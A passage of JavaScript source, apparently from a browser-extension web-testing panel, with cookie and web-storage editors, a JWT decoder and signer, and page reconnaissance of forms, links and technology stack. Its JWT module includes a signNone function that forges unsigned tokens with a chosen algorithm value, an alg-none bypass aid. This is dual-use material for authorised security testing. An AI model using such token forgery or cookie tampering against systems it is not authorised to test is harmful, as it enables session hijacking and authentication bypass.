'use strict';

// ─── Core helpers ─────────────────────────────────────────────────────────────

const $ = id => document.getElementById(id);
const $$ = sel => document.querySelectorAll(sel);
const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
const copyText = t => navigator.clipboard.writeText(String(t)).catch(() => {});
const isJWT = v => /^[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/.test((v||'').trim());

function prettyJSON(str) {
  try {
    const obj = JSON.parse(str);
    if (typeof obj === 'object' && obj !== null) return JSON.stringify(obj, null, 2);
  } catch {}
  return null;
}

function bg(type, data = {}) {
  return new Promise(resolve =>
    chrome.runtime.sendMessage({ type, ...data }, r => {
      if (chrome.runtime.lastError) return resolve({ error: chrome.runtime.lastError.message });
      resolve(r || {});
    })
  );
}

async function getActiveTab() {
  // DevTools panel: inspectedWindow.tabId is the correct tab regardless of focus
  if (typeof chrome.devtools !== 'undefined' && chrome.devtools.inspectedWindow?.tabId) {
    return chrome.tabs.get(chrome.devtools.inspectedWindow.tabId).catch(() => null);
  }
  // Popup context: lastFocusedWindow is reliable
  const tabs = await chrome.tabs.query({ active: true, lastFocusedWindow: true });
  return tabs[0] ?? null;
}

function isHttpUrl(url) {
  return typeof url === 'string' && (url.startsWith('http://') || url.startsWith('https://'));
}

// execPage injects a real function (no eval) — works on sites that block eval (e.g. GitHub CSP)
async function execPage(fn, args = []) {
  const tab = await getActiveTab();
  const url = tab?.url ?? '';
  if (!tab?.id || !isHttpUrl(url)) {
    throw new Error('Navigate to a real http/https page first.');
  }
  const results = await chrome.scripting.executeScript({
    target: { tabId: tab.id },
    world: 'MAIN',
    func: fn,
    args,
  });
  return results?.[0]?.result ?? null;
}

function readStorageNamespace(ns) {
  try {
    return JSON.stringify(Object.fromEntries(
      Object.keys(window[ns]).map(k => [k, window[ns].getItem(k)])
    ));
  } catch {
    return '{}';
  }
}

function toast(msg, type = 'info') {
  const el = document.createElement('div');
  el.className = `toast ${type}`;
  el.textContent = msg;
  $('toast-container').appendChild(el);
  setTimeout(() => el.remove(), 3000);
}

// ─── State ────────────────────────────────────────────────────────────────────

const state = {
  tabId:           null,
  tabUrl:          '',
  localCache:      {},
  sessionCache:    {},
  cookiesCache:    [],
  cookieEditIdx:   null,
  storageAddType:  'local',
  storageEditKey:  null,
  roles:           [],
  activeRoleId:    null,
  jwtSourceCookie: null,
  ctxIdx:          null,
  storageView:     'local',
  roleEditId:      null,
  ctxSource:       null,
};

// ─── Tabs ─────────────────────────────────────────────────────────────────────

function initTabs() {
  $$('.tab-btn').forEach(btn => btn.addEventListener('click', () => {
    $$('.tab-btn').forEach(b => b.classList.remove('active'));
    $$('.tab-pane').forEach(p => { p.classList.remove('active'); p.classList.add('hidden'); });
    btn.classList.add('active');
    const pane = $('tab-' + btn.dataset.tab);
    pane.classList.remove('hidden');
    pane.classList.add('active');
  }));
}

// ─── Cookies ──────────────────────────────────────────────────────────────────

const Cookies = {
  async load() {
    const { cookies = [] } = await bg('GET_COOKIES', { url: state.tabUrl });
    state.cookiesCache = cookies;
    this.render();
  },

  render() {
    const filter = $('cookies-filter').value.toLowerCase();
    const rows = state.cookiesCache
      .map((c, i) => ({ c, i, jwt: isJWT(c.value) }))
      .filter(({ c }) => !filter ||
        c.name.toLowerCase().includes(filter) ||
        c.value.toLowerCase().includes(filter)
      )
      .sort((a, b) => (b.jwt ? 1 : 0) - (a.jwt ? 1 : 0))
      .map(({ c, i }) => {
        const jwt = isJWT(c.value);
        const shortVal = esc(c.value.substring(0, 80)) + (c.value.length > 80 ? '…' : '');
        const ss = c.sameSite && c.sameSite !== 'no_restriction' && c.sameSite !== 'unspecified';
        const badges = [
          c.httpOnly ? `<span class="flag-badge on">HttpOnly</span>` : '',
          c.secure   ? `<span class="flag-badge on">Secure</span>` : '',
          ss         ? `<span class="flag-badge ss">${esc(c.sameSite)}</span>` : '',
          jwt        ? `<span class="flag-badge jwt">JWT</span>` : '',
          !c.expirationDate ? `<span class="flag-badge">Session</span>` : '',
          c.domain   ? `<span class="flag-badge dim" title="${esc(c.domain)}${esc(c.path)}">${esc(c.domain.replace(/^\./,''))}</span>` : '',
        ].filter(Boolean).join('');
        return `
        <div class="st-entry ${jwt ? 'jwt-entry' : ''}" data-idx="${i}">
          <div class="st-entry-btns">
            <button class="sm" data-action="edit" data-idx="${i}" title="Edit" aria-label="Edit">✎</button>
            <button class="sm danger" data-action="del" data-idx="${i}" title="Delete" aria-label="Delete">✕</button>
            <button class="sm" data-action="copy" data-idx="${i}" title="Copy" aria-label="Copy">⧉</button>
            ${jwt ? `<button class="sm jwt-send" data-action="send-jwt" data-idx="${i}">JWT</button>` : ''}
          </div>
          <div class="st-entry-content">
            <div class="st-entry-key"><span class="st-label">Name:</span> <span class="ck-text">${esc(c.name)}</span></div>
            <div class="st-entry-val"><span class="st-label">Value:</span> <span class="val-text">${esc(prettyJSON(c.value) || c.value)}</span></div>
            <div class="ck-meta-flags">${badges}</div>
          </div>
        </div>`;
      })
      .join('');
    $('cookies-body').innerHTML = rows || '<div class="empty" style="padding:10px">No cookies</div>';
  },

  inlineEdit(idx, field, td) {
    if (td.querySelector('textarea')) return;
    const c = state.cookiesCache[idx];
    const orig = c[field];
    const input = document.createElement('textarea');
    input.className = 'inline-input';
    input.value = orig;
    input.rows = Math.max(2, Math.ceil(orig.length / 60));
    td.textContent = '';
    td.appendChild(input);
    input.focus();
    input.select();

    let saved = false;
    const save = async () => {
      if (saved) return;
      saved = true;
      const newVal = input.value;
      if (newVal === orig) { this.render(); return; }
      await this.inlineSave(idx, field, newVal);
    };
    input.addEventListener('keydown', e => {
      if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); save(); }
      if (e.key === 'Escape') { saved = true; this.render(); }
    });
    input.addEventListener('blur', save);
  },

  async inlineSave(idx, field, newVal) {
    const c = state.cookiesCache[idx];
    const scheme = (c.secure || state.tabUrl.startsWith('https')) ? 'https' : 'http';
    const host   = c.domain.startsWith('.') ? c.domain.slice(1) : c.domain;
    const url    = `${scheme}://${host}${c.path}`;

    if (field === 'name' && newVal !== c.name) {
      await bg('REMOVE_COOKIE', { url, name: c.name });
    }
    const cookie = { url, name: field === 'name' ? newVal : c.name, value: field === 'value' ? newVal : c.value, domain: c.domain, path: c.path, httpOnly: c.httpOnly, secure: c.secure, sameSite: c.sameSite };
    if (c.expirationDate) cookie.expirationDate = c.expirationDate;
    const { error } = await bg('SET_COOKIE', { cookie });
    if (error) { toast(`Error: ${error.message}`, 'error'); }
    else toast('Saved', 'success');
    this.load();
  },

  sendToJWT(idx) {
    const c = state.cookiesCache[idx];
    state.jwtSourceCookie = c;
    $$('.tab-btn').forEach(b => b.classList.remove('active'));
    $$('.tab-pane').forEach(p => { p.classList.remove('active'); p.classList.add('hidden'); });
    document.querySelector('.tab-btn[data-tab="jwt"]').classList.add('active');
    const pane = $('tab-jwt');
    pane.classList.remove('hidden');
    pane.classList.add('active');
    $('jwt-input').value = c.value;
    $('jwt-cookie-source').textContent = `← from cookie: ${c.name}`;
    $('jwt-cookie-source').classList.remove('hidden');
    $('jwt-to-cookie-btn').classList.remove('hidden');
    try {
      const { header, payload } = JWT.decode(c.value);
      $('jwt-header').value  = JSON.stringify(header, null, 2);
      $('jwt-payload').value = JSON.stringify(payload, null, 2);
      $('jwt-sections').classList.remove('hidden');
    } catch {}
    hideCtxMenu();
  },

  openEdit(idx) {
    state.cookieEditIdx = idx;
    const c = idx !== null ? state.cookiesCache[idx] : null;
    $('cookie-modal-title').textContent = c ? 'Edit Cookie' : 'Add Cookie';
    $('ck-name').value    = c?.name  ?? '';
    $('ck-value').value   = c?.value ?? '';
    $('ck-domain').value  = c?.domain ?? (new URL(state.tabUrl).hostname || '');
    $('ck-path').value    = c?.path  ?? '/';
    $('ck-expires').value = c?.expirationDate ? tsToDatetimeLocal(c.expirationDate) : '';
    $('ck-httponly').checked = c?.httpOnly ?? false;
    $('ck-secure').checked   = c?.secure   ?? false;
    $('ck-samesite').value   = c?.sameSite ?? 'no_restriction';
    $('cookie-modal').classList.remove('hidden');
    $('ck-name').focus();
  },

  closeModal() {
    $('cookie-modal').classList.add('hidden');
    state.cookieEditIdx = null;
  },

  async save() {
    const name    = $('ck-name').value.trim();
    const value   = $('ck-value').value;
    const domain  = $('ck-domain').value.trim();
    const path    = $('ck-path').value || '/';
    const expStr  = $('ck-expires').value;
    const httpOnly = $('ck-httponly').checked;
    const secure   = $('ck-secure').checked;
    const sameSite = $('ck-samesite').value;

    if (!name) { toast('Name required', 'error'); return; }

    const scheme = (secure || state.tabUrl.startsWith('https')) ? 'https' : 'http';
    const host   = domain.startsWith('.') ? domain.slice(1) : domain;
    const url    = `${scheme}://${host}${path}`;

    const cookie = { url, name, value, domain, path, httpOnly, secure, sameSite };
    if (expStr) cookie.expirationDate = datetimeLocalToTs(expStr);

    if (state.cookieEditIdx !== null) {
      const old = state.cookiesCache[state.cookieEditIdx];
      if (old.name !== name || old.domain !== domain || old.path !== path) {
        const oldScheme = old.secure ? 'https' : 'http';
        const oldHost   = old.domain.startsWith('.') ? old.domain.slice(1) : old.domain;
        await bg('REMOVE_COOKIE', { url: `${oldScheme}://${oldHost}${old.path}`, name: old.name });
      }
    }

    const { error } = await bg('SET_COOKIE', { cookie });
    if (error) { toast(`Error: ${error.message}`, 'error'); return; }
    toast('Saved', 'success');
    this.closeModal();
    this.load();
  },

  async del(idx) {
    const c = state.cookiesCache[idx];
    const scheme = c.secure ? 'https' : 'http';
    const host   = c.domain.startsWith('.') ? c.domain.slice(1) : c.domain;
    await bg('REMOVE_COOKIE', { url: `${scheme}://${host}${c.path}`, name: c.name });
    toast('Deleted', 'success');
    this.load();
  },

  async clearAll() {
    if (!confirm(`Delete all ${state.cookiesCache.length} cookies for this site?`)) return;
    await Promise.all(state.cookiesCache.map(c => {
      const scheme = c.secure ? 'https' : 'http';
      const host   = c.domain.startsWith('.') ? c.domain.slice(1) : c.domain;
      return bg('REMOVE_COOKIE', { url: `${scheme}://${host}${c.path}`, name: c.name });
    }));
    toast('All cookies cleared', 'success');
    this.load();
  },
};

function tsToDatetimeLocal(ts) {
  return new Date(ts * 1000).toISOString().slice(0, 16);
}
function datetimeLocalToTs(str) {
  return Math.floor(new Date(str).getTime() / 1000);
}

// ─── Storage ──────────────────────────────────────────────────────────────────

const Storage = {
  _safeParse(raw) {
    try { return JSON.parse(raw || '{}'); } catch { return {}; }
  },

  async loadLocal() {
    const raw = await execPage(readStorageNamespace, ['localStorage']).catch(() => '{}');
    state.localCache = this._safeParse(raw);
    this.renderTable('local', state.localCache);
  },

  async loadSession() {
    const raw = await execPage(readStorageNamespace, ['sessionStorage']).catch(() => '{}');
    state.sessionCache = this._safeParse(raw);
    this.renderTable('session', state.sessionCache);
  },

  async load() {
    await Promise.all([this.loadLocal(), this.loadSession()]);
  },

  switchView(type) {
    state.storageView = type;
    const showLocal = type === 'local';
    $('local-panel').classList.toggle('hidden', !showLocal);
    $('session-panel').classList.toggle('hidden', showLocal);
    $('storage-switch-local').classList.toggle('primary', showLocal);
    $('storage-switch-session').classList.toggle('primary', !showLocal);
    $('local-count').classList.toggle('hidden', !showLocal);
    $('session-count').classList.toggle('hidden', showLocal);

    if (showLocal) this.loadLocal();
    else this.loadSession();
  },

  renderTable(type, data) {
    const bodyId   = `${type}-body`;
    const countEl  = $(`${type}-count`);
    const filter   = ($('storage-filter')?.value || '').toLowerCase();
    const entries  = Object.entries(data).filter(([k, v]) =>
      !filter || k.toLowerCase().includes(filter) || String(v).toLowerCase().includes(filter)
    );
    if (countEl) countEl.textContent = entries.length;
    const rows = entries.map(([k, v]) => {
      const vStr = String(v);
      const pretty = prettyJSON(vStr);
      const display = pretty || vStr;
      const collapsible = display.length > 80;
      const preview = collapsible ? esc(vStr.substring(0, 60)) + '…' : '';
      const valHtml = collapsible
        ? `<div class="collapsible collapsed">
            <span class="collapse-preview">${preview}</span>
            <span class="collapse-full val-text">${esc(display)}</span>
            <button class="collapse-btn" data-action="toggle-collapse" aria-label="Toggle value"></button>
          </div>`
        : `<span class="val-text">${esc(display)}</span>`;
      return `<div class="st-entry" data-type="${esc(type)}" data-key="${esc(k)}">
        <div class="st-entry-btns">
          <button class="sm" data-action="st-edit" data-st="${esc(type)}" data-skey="${esc(k)}" title="Edit" aria-label="Edit">✎</button>
          <button class="sm danger" data-action="st-del" data-st="${esc(type)}" data-skey="${esc(k)}" title="Delete" aria-label="Delete">✕</button>
          <button class="sm" data-action="st-copy" data-val="${esc(vStr)}" title="Copy" aria-label="Copy">⧉</button>
        </div>
        <div class="st-entry-content">
          <div class="st-entry-key"><span class="st-label">Key:</span> <span class="ck-text">${esc(k)}</span></div>
          <div class="st-entry-val"><span class="st-label">Value:</span> ${valHtml}</div>
        </div>
      </div>`;
    }).join('');
    $(bodyId).innerHTML = rows || `<div class="empty" style="padding:10px">Empty</div>`;
  },

  inlineEdit(type, field, key, el) {
    const cache = type === 'local' ? state.localCache : state.sessionCache;
    const cur = field === 'key' ? key : (cache[key] ?? '');
    const inp = document.createElement('textarea');
    inp.className = 'inline-input';
    inp.value = cur;
    inp.rows = Math.max(2, Math.ceil(String(cur).length / 60));
    el.replaceWith(inp);
    inp.focus(); inp.select();
    const commit = async () => {
      const nv = inp.value;
      if (nv === cur) { this.renderTable(type, cache); return; }
      const nsName = type === 'local' ? 'localStorage' : 'sessionStorage';
      if (field === 'key') {
        const oldVal = cache[key];
        await execPage((ns, k) => window[ns].removeItem(k), [nsName, key]);
        await execPage((ns, k, v) => window[ns].setItem(k, v), [nsName, nv, oldVal]);
      } else {
        await execPage((ns, k, v) => window[ns].setItem(k, v), [nsName, key, nv]);
      }
      toast('Saved', 'success');
      await this.load();
    };
    inp.addEventListener('blur',    commit);
    inp.addEventListener('keydown', e => {
      if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); inp.blur(); }
      if (e.key === 'Escape') { inp.removeEventListener('blur', commit); this.renderTable(type, cache); }
    });
  },

  openAdd(type) {
    state.storageAddType = type;
    state.storageEditKey = null;
    $('storage-modal-title').textContent = `Add to ${type}Storage`;
    $('sk-key').value   = '';
    $('sk-value').value = '';
    $('sk-key').disabled = false;
    $('storage-modal').classList.remove('hidden');
    $('sk-key').focus();
  },

  openEdit(type, key) {
    const cache = type === 'local' ? state.localCache : state.sessionCache;
    state.storageAddType = type;
    state.storageEditKey = key;
    $('storage-modal-title').textContent = `Edit — ${type}Storage`;
    $('sk-key').value   = key;
    $('sk-value').value = cache[key] ?? '';
    $('sk-key').disabled = false;
    $('storage-modal').classList.remove('hidden');
    $('sk-value').focus();
  },

  closeModal() {
    $('storage-modal').classList.add('hidden');
    state.storageEditKey = null;
  },

  async save() {
    const key = $('sk-key').value.trim();
    const val = $('sk-value').value;
    if (!key) { toast('Key required', 'error'); return; }
    const nsName = state.storageAddType === 'local' ? 'localStorage' : 'sessionStorage';
    if (state.storageEditKey && state.storageEditKey !== key) {
      await execPage((ns, k) => window[ns].removeItem(k), [nsName, state.storageEditKey]);
    }
    await execPage((ns, k, v) => window[ns].setItem(k, v), [nsName, key, val]);
    toast('Saved', 'success');
    this.closeModal();
    this.load();
  },

  async del(type, key) {
    const nsName = type === 'local' ? 'localStorage' : 'sessionStorage';
    await execPage((ns, k) => window[ns].removeItem(k), [nsName, key]);
    toast('Deleted', 'success');
    this.load();
  },

  async clearAll(type) {
    const nsName = type === 'local' ? 'localStorage' : 'sessionStorage';
    if (!confirm(`Clear all ${nsName} entries?`)) return;
    await execPage((ns) => window[ns].clear(), [nsName]);
    toast('Cleared', 'success');
    this.load();
  },
};

// ─── JWT ──────────────────────────────────────────────────────────────────────

function b64urlEncode(str) {
  return btoa(unescape(encodeURIComponent(str)))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
}

function b64urlDecode(str) {
  const padded = str + '==='.slice((str.length + 3) % 4);
  try {
    return decodeURIComponent(escape(atob(padded.replace(/-/g, '+').replace(/_/g, '/'))));
  } catch {
    return atob(padded.replace(/-/g, '+').replace(/_/g, '/'));
  }
}

const JWT = {
  decode(token) {
    const parts = token.trim().split('.');
    if (parts.length < 2) throw new Error('Not a valid JWT (need at least header.payload)');
    const header  = JSON.parse(b64urlDecode(parts[0]));
    const payload = JSON.parse(b64urlDecode(parts[1]));
    return { header, payload, sig: parts[2] ?? '' };
  },

  async signHS256(header, payload, secret) {
    const h = b64urlEncode(JSON.stringify(header));
    const p = b64urlEncode(JSON.stringify(payload));
    const data = `${h}.${p}`;
    const key = await crypto.subtle.importKey(
      'raw', new TextEncoder().encode(secret),
      { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
    );
    const sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(data));
    const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
      .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
    return `${data}.${sigB64}`;
  },

  signNone(header, payload, algValue) {
    const h = b64urlEncode(JSON.stringify({ ...header, alg: algValue }));
    const p = b64urlEncode(JSON.stringify(payload));
    return `${h}.${p}.`;
  },

  async verifyHS256(token, secret) {
    const parts = token.trim().split('.');
    if (parts.length !== 3) throw new Error('Need 3 parts');
    const data = `${parts[0]}.${parts[1]}`;
    const key = await crypto.subtle.importKey(
      'raw', new TextEncoder().encode(secret),
      { name: 'HMAC', hash: 'SHA-256' }, false, ['verify']
    );
    const sigBytes = Uint8Array.from(atob(parts[2].replace(/-/g,'+').replace(/_/g,'/')), c => c.charCodeAt(0));
    return crypto.subtle.verify('HMAC', key, sigBytes, new TextEncoder().encode(data));
  },
};

// ─── Recon ────────────────────────────────────────────────────────────────────

const Recon = {
  async assertScriptable() {
    const tab = await getActiveTab();
    if (!isHttpUrl(tab?.url)) throw new Error('Navigate to a real http/https page first.');
    // Refresh state.tabUrl so sourceScan and cookie load stay accurate
    state.tabUrl = tab.url;
  },

  async forms() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    const raw = await execPage(() => {
      try {
        return JSON.stringify(Array.from(document.querySelectorAll('form')).map(f => ({
          id:     f.id || null,
          action: f.action,
          method: (f.method || 'GET').toUpperCase(),
          inputs: Array.from(f.querySelectorAll('input,select,textarea')).map(el => ({
            type:  el.type || el.tagName.toLowerCase(),
            name:  el.name,
            id:    el.id,
            value: el.type === 'password' ? '***' : el.value,
            placeholder: el.placeholder || '',
          })),
        })));
      } catch { return '[]'; }
    }).catch(e => { toast(String(e), 'error'); return '[]'; });
    const forms = JSON.parse(raw);
    let html = `<div class="recon-section" id="recon-sec-forms" data-severity="info" data-section-name="Forms"><h4>Forms (${forms.length}) <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;
    if (!forms.length) html += '<div class="recon-item muted">No forms found</div>';
    forms.forEach(f => {
      html += `<div class="recon-item">
        <b>${esc(f.method)}</b> ${esc(f.action)}${f.id ? ` <span class="muted">#${esc(f.id)}</span>` : ''}
        <div style="margin-top:4px;color:var(--dim)">`;
      f.inputs.forEach(i => {
        html += `<span style="margin-right:10px">[<b>${esc(i.type)}</b>] name=<span style="color:var(--text)">${esc(i.name)}</span>${i.value ? ` val=${esc(i.value)}` : ''}</span>`;
      });
      html += `</div></div>`;
    });
    html += '</div>';
    appendRecon(html);
  },

  async links() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });
    const raw = await execPage(() => {
      try {
        const links = [...new Set([
          ...Array.from(document.querySelectorAll('a[href]')).map(a => a.href),
          ...Array.from(document.querySelectorAll('form[action]')).map(f => f.action),
          ...Array.from(document.querySelectorAll('script[src]')).map(s => s.src),
          ...Array.from(document.querySelectorAll('link[href]')).map(l => l.href),
          ...Array.from(document.querySelectorAll('iframe[src]')).map(i => i.src),
          ...Array.from(document.querySelectorAll('img[src]')).map(i => i.src),
        ].filter(u => u && !u.startsWith('data:')))];
        const byDomain = {};
        links.forEach(u => {
          try {
            const host = new URL(u).hostname;
            if (!byDomain[host]) byDomain[host] = [];
            byDomain[host].push(u);
          } catch {}
        });
        return JSON.stringify(byDomain);
      } catch { return '{}'; }
    }).catch(e => { toast(String(e), 'error'); return '{}'; });
    const byDomain = JSON.parse(raw);
    const total = Object.values(byDomain).flat().length;
    const SPIDER_PREVIEW = 40;
    let html = `<div class="recon-section" id="recon-sec-links" data-severity="info" data-section-name="Links"><h4>Discovered Links &amp; Assets (${total}) <button class="recon-copy-btn" data-action="recon-copy" title="Copy">⧉</button></h4>`;
    for (const [domain, urls] of Object.entries(byDomain)) {
      html += `<div class="recon-item"><b>${esc(domain)}</b> <span class="muted">(${urls.length})</span><div class="recon-spider-urls">`;
      urls.slice(0, SPIDER_PREVIEW).forEach(u => {
        html += `<div class="muted recon-spider-line" style="font-size:13px;padding:1px 0">${esc(u)}</div>`;
      });
      if (urls.length > SPIDER_PREVIEW) {
        const rest = urls.slice(SPIDER_PREVIEW);
        html += `<div class="collapsible recon-spider-extra collapsed">
          <div class="collapse-full">${rest.map(u => `<div class="muted recon-spider-line" style="font-size:13px;padding:1px 0">${esc(u)}</div>`).join('')}</div>
          <div class="recon-spider-more-ctrls">
            <span class="collapse-preview muted" data-action="toggle-collapse">+${rest.length} more (expand)</span>
            <button type="button" class="collapse-btn" data-action="toggle-collapse" aria-label="Toggle extra URLs"></button>
          </div>
        </div>`;
      }
      html += `</div></div>`;
    }
    if (!total) html += '<div class="recon-item muted">No links found</div>';
    html += '</div>';
    appendRecon(html);
  },

  async techStack() {
    await this.assertScriptable().catch(e => { toast(String(e), 'warn'); throw e; });

    // Fetch response headers via background (state.tabUrl set by assertScriptable)
    const pageUrl = state.tabUrl;
    let respHeaders = {};
    if (isHttpUrl(pageUrl)) {
      const resp = await bg('FETCH', { url: pageUrl }).catch(() => null);
      if (resp?.headers) respHeaders = resp.headers;
    }

    const raw = await execPage(() => {
      try {
        const w = window, d = document;
        const meta = n => d.querySelector(`meta[name="${n}"]`)?.content || d.querySelector(`meta[property="${n}"]`)?.content || '';
        const ck = d.cookie;
        const detect = {
          // JS Frameworks
          'React':           !!(w.React || w.__REACT_DEVTOOLS_GLOBAL_HOOK__?.renderers?.size),
          'Next.js':         !!w.__NEXT_DATA__,
          'Gatsby':          !!(w.___gatsby || d.querySelector('#gatsby-focus-wrapper')),
          'Remix':           !!(w.__remixContext || w.__remixRouteModules),
          'Vue':             !!(w.Vue || w.__VUE__ || d.querySelector('[data-v-app]')),
          'Nuxt':            !!w.__NUXT__,
          'Quasar':          !!w.Quasar,
          'Angular':         !!(w.angular || d.querySelector('[ng-version]')),
          'Svelte':          !!(w.__svelte || d.querySelector('[class*="svelte-"]')),
          'SvelteKit':       !!(w.__sveltekit_data || d.querySelector('script[data-sveltekit-prefetch]')),
          'Ember':           !!w.Ember,
          'Backbone':        !!w.Backbone,
          'Alpine.js':       !!(w.Alpine || d.querySelector('[x-data]')),
          'htmx':            !!(w.htmx || d.querySelector('[hx-get],[hx-post]')),
          'Preact':          !!(w.preact),
          'Solid.js':        !!(w._$HY),
          'Astro':           !!(d.querySelector('script[type="module"][src*="/_astro/"]') || meta('generator').includes('Astro')),
          'Qwik':            !!(w.qwikevents || d.querySelector('[q\\:container]')),
          // Libraries
          'jQuery':          !!(w.jQuery?.fn?.jquery),
          'Lodash':          !!(w._?.VERSION && w._.map),
          'Moment.js':       !!w.moment,
          'Day.js':          !!w.dayjs,
          'Axios':           !!(w.axios?.get),
          'D3.js':           !!(w.d3?.version),
          'Three.js':        !!(w.THREE?.REVISION),
          'Chart.js':        !!(w.Chart?.version),
          'GSAP':            !!(w.gsap || w.TweenMax),
          'Swiper':          !!w.Swiper,
          'Socket.io':       !!(w.io?.Socket),
          // CSS Frameworks
          'Bootstrap':       !!(w.bootstrap || d.querySelector('.container-fluid,.col-md-12,.navbar-collapse')),
          'Tailwind CSS':    !!(d.querySelector('[class*="tw-"]') || (d.querySelector('[class*="text-sm"]') && d.querySelector('[class*="bg-"]'))),
          'Bulma':           !!(d.querySelector('.is-flex,.columns,.column.is-')),
          'Foundation':      !!(w.Foundation || d.querySelector('.row.expanded,.callout')),
          // Build tools
          'Webpack':         !!(w.webpackChunk || w.__webpack_require__),
          'Vite':            !!(w.__vite_is_modern_browser || d.querySelector('script[src*="/@vite/"]')),
          'Parcel':          !!w.parcelRequire,
          // CMS / Platform
          'WordPress':       !!(d.querySelector('link[href*="wp-content"],link[href*="wp-includes"]') || meta('generator').includes('WordPress')),
          'Drupal':          !!(w.Drupal || d.querySelector('[data-drupal-link]')),
          'Joomla':          !!(w.Joomla || meta('generator').includes('Joomla')),
          'Ghost':           !!(meta('generator').includes('Ghost') || d.querySelector('link[href*="/ghost/"]')),
          'Webflow':         !!(d.querySelector('[data-wf-site]') || meta('generator').includes('Webflow')),
          'Squarespace':     !!(w.Static?.SQUARESPACE_CONTEXT || meta('generator').includes('Squarespace')),
          'Wix':             !!(w.wixBiSession || d.querySelector('[data-mesh-id]')),
          // E-commerce
          'Shopify':         !!(w.Shopify || d.querySelector('[data-shopify]')),
          'WooCommerce':     !!(d.querySelector('.woocommerce,body.woocommerce')),
          'BigCommerce':     !!(w.BCData),
          'Magento':         !!(w.Mage),
          'PrestaShop':      !!(w.prestashop),
          // Analytics
          'Google Analytics':     !!(w.ga || w.gtag || w.GoogleAnalyticsObject || d.querySelector('script[src*="google-analytics"],script[src*="gtag/js"]')),
          'Google Tag Manager':   !!(w.google_tag_manager || d.querySelector('script[src*="googletagmanager"]')),
          'Mixpanel':        !!(w.mixpanel?.track),
          'Amplitude':       !!(w.amplitude || w.amplitudeAnalytics),
          'Segment':         !!(w.analytics?.identify),
          'Heap':            !!(w.heap?.track),
          'Hotjar':          !!(w.hj || w.hjSiteSettings),
          'FullStory':       !!(w._fs_namespace),
          'Matomo':          !!(w.Matomo || w._paq),
          'Microsoft Clarity': !!w.clarity,
          'PostHog':         !!(w.posthog?.capture),
          'Plausible':       !!(d.querySelector('script[src*="plausible"]')),
          // Advertising / Pixels
          'Facebook Pixel':  !!(w.fbq || d.querySelector('script[src*="connect.facebook.net"]')),
          'Google Ads':      !!(w.google_conversion_id || d.querySelector('script[src*="googleadservices"]')),
          'LinkedIn Insight':!!(w._linkedin_data_partner_id || d.querySelector('script[src*="snap.licdn"]')),
          'TikTok Pixel':    !!(w.ttq || d.querySelector('script[src*="analytics.tiktok"]')),
          // Security / Anti-bot
          'reCAPTCHA':       !!(w.grecaptcha || d.querySelector('script[src*="recaptcha"]')),
          'hCaptcha':        !!(w.hcaptcha || d.querySelector('script[src*="hcaptcha"]')),
          'CF Turnstile':    !!(w.turnstile || d.querySelector('script[src*="challenges.cloudflare"]')),
          // Payment
          'Stripe':          !!(w.Stripe || d.querySelector('script[src*="js.stripe.com"]')),
          'PayPal':          !!(w.paypal || d.querySelector('script[src*="paypal.com/sdk"]')),
          'Braintree':       !!(w.braintree),
          // Maps
          'Google Maps':     !!(w.google?.maps || d.querySelector('script[src*="maps.googleapis"]')),
          'Mapbox':          !!(w.mapboxgl),
          'Leaflet':         !!(w.L?.map && w.L?.version),
          // Monitoring / Error tracking
          'Sentry':          !!(w.Sentry || w.__sentryRewritesTunnel),
          'Datadog RUM':     !!w.DD_RUM,
          'New Relic':       !!w.newrelic,
          'LogRocket':       !!w.LogRocket,
          'Bugsnag':         !!w.Bugsnag,
          // Live Chat
          'Intercom':        !!(w.Intercom || w.intercomSettings),
          'Zendesk':         !!(w.zE || w.zESettings),
          'Drift':           !!(w.drift?.page),
          'Crisp':           !!(w.$crisp || w.CRISP_WEBSITE_ID),
          'Tawk.to':         !!(w.Tawk_API || d.querySelector('script[src*="tawk.to"]')),
          'HubSpot Chat':    !!(w.HubSpotConversations || d.querySelector('script[src*="hs-scripts"]')),
          // Backend signals
          'PHP':             !!(ck.includes('PHPSESSID')),
          'ASP.NET':         !!(d.querySelector('input[name="__VIEWSTATE"],input[name="__RequestVerificationToken"]')),
          'Laravel':         !!(d.querySelector('meta[name="csrf-token"]') && !d.querySelector('input[name="csrfmiddlewaretoken"]') && !d.querySelector('meta[name="csrf-param"]')),
          'Django':          !!(d.querySelector('input[name="csrfmiddlewaretoken"]')),
          'Rails':           !!(d.querySelector('meta[name="csrf-token"]') && d.querySelector('meta[name="csrf-param"]')),
          // CDN (DOM signals)
          'Cloudflare':      !!(ck.includes('__cf_bm') || ck.includes('cf_clearance') || d.querySelector('script[src*="cloudflare.com"]')),
          'jsDelivr':        !!(d.querySelector('script[src*="cdn.jsdelivr.net"],link[href*="cdn.jsdelivr.net"]')),
          'unpkg':           !!(d.querySelector('script[src*="unpkg.com"],link[href*="unpkg.com"]')),
          // Fonts
          'Google Fonts':    !!(d.querySelector('link[href*="fonts.googleapis.com"],link[href*="fonts.gstatic.com"]')),
          'Adobe Fonts':     !!(d.querySelector('link[href*="use.typekit"],script[src*="use.typekit"]') || w.Typekit),
        };
        const generator = meta('generator') || null;
        const detected = Object.entries(detect).filter(([,v]) => v).map(([k]) => k);
        return JSON.stringify({ detected, generator });
      } catch { return '{"detected":[],"generator":null}'; }
    }).catch(e => { toast(String(e), 'error'); return '{"detected":[],"generator":null}'; });

    const { detected, generator } = JSON.parse(raw);

    const CATS = {
      'React':'JS Framework','Next.js':'JS Framework','Gatsby':'JS Framework','Remix':'JS Framework',
      'Vue':'JS Framework','Nuxt':'JS Framework','Quasar':'JS Framework','Angular':'JS Framework',
      'Svelte':'JS Framework','SvelteKit':'JS Framework','Ember':'JS Framework','Backbone':'JS Framework',
      'Alpine.js':'JS Framework','htmx':'JS Framework','Preact':'JS Framework','Solid.js':'JS Framework',
